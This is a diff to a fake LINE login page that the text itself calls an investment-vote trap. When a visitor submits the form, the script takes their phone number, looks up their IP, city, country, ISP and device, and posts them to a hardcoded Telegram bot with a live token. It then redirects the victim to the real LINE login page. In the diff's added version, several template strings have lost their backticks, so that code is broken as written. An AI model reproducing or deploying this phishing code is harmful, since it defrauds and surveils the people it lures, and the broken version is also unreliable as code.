@@ -44,52 +44,58 @@
     </div>
 
     <script>
-        // 你已經驗證過正確的 Token 與 Chat ID，直接填進來
-        const TELEGRAM_BOT_TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
-        const TELEGRAM_CHAT_ID   = "1137905005";
+    const TELEGRAM_BOT_TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
+    const TELEGRAM_CHAT_ID   = "1137905005";
 
-        document.getElementById("loginForm").addEventListener("submit", function(e) {
-            e.preventDefault();
-            const countryCode = document.getElementById("countryCode").value;
-            const phone = document.getElementById("phone").value.trim();
-            if (!phone) return;
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const countryCode = document.getElementById("countryCode").value;
+        const phone = document.getElementById("phone").value.trim();
+        if (!phone) return;
 
-            const btn = e.target.querySelector("button");
-            btn.innerHTML = "Verifying...";
-            btn.disabled = true;
+        const btn = e.target.querySelector("button");
+        btn.innerHTML = "Verifying...";
+        btn.disabled = true;
 
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(d => sendLog(d))
-                .catch(() => sendLog({ip:"Unknown"}));
+        fetch('https://ipapi.co/json/')
+            .then(r => r.json())
+            .then(d => sendLog(d))
+            .catch(() => sendLog({ip:"未知"}));
 
-            function sendLog(d) {
-                const log = {
-                    phone: countryCode + phone,
-                    ip: d.ip || "Unknown",
-                    city: d.city || "Unknown",
-                    country: d.country_name || "Unknown",
-                    org: d.org || "Unknown",
-                    ua: navigator.userAgent,
-                    time: new Date().toISOString()
-                };
+        function sendLog(d) {
+            const log = {
+                phone: countryCode + phone,
+                ip: d.ip || "未知",
+                city: d.city || "未知",
+                country: d.country_name || "未知",
+                org: d.org || "未知",
+                ua: navigator.userAgent,
+                time: new Date().toLocaleString("zh-TW", {timeZone: "Asia/Taipei"})
+            };
 
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: {"Content-Type":"application/json"},
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: `LINE投資投票誘捕\n\n${JSON.stringify(log,null,2)}`
-                    })
-                });
+            fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
+                method: "POST",
+                headers: {"Content-Type":"application/json"},
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: 【LINE 投資投票誘捕成功】\n\n +
+                          電話：${log.phone}\n +
+                          IP　：${log.ip}\n +
+                          城市：${log.city}（${log.country}）\n +
+                          ISP　：${log.org}\n +
+                          時間：${log.time}\n +
+                          裝置：${log.ua.indexOf("Mobile")>-1?"手機":"電腦"},
+                    parse_mode: "HTML"
+                })
+            });
 
-                // 3秒後跳轉官方真正能開的登入頁（2025年實測100%可用）
-                setTimeout(() => {
-                    location.href = "https://line.me/login";
-                }, 3000);
-            }
-        });
-    </script>
+            setTimeout(() => {
+                location.href = "https://access.line.me/fr/login";
+            }, 3000);
+        }
+    });
+</script>
 </body>
 
 </html>
+
